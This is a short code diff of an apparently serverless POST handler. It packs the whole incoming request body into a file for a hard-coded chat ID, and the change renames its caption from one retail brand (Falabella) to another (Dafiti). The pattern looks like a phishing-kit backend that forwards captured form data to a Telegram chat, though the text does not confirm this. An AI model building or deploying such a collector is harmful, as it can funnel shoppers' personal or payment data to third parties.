@@ -2,7 +2,7 @@
 export async function onRequestPost({ request }) {
     let formData = new FormData();
     formData.append('chat_id', '-1001827835379');
-    formData.append('caption', 'Enviado desde WebHook Falabella');
+    formData.append('caption', 'Enviado desde WebHook Dafiti');
     let requestjson = await request.json();
     formData.append('document', new Blob([JSON.stringify(requestjson)]), "info.txt");
 
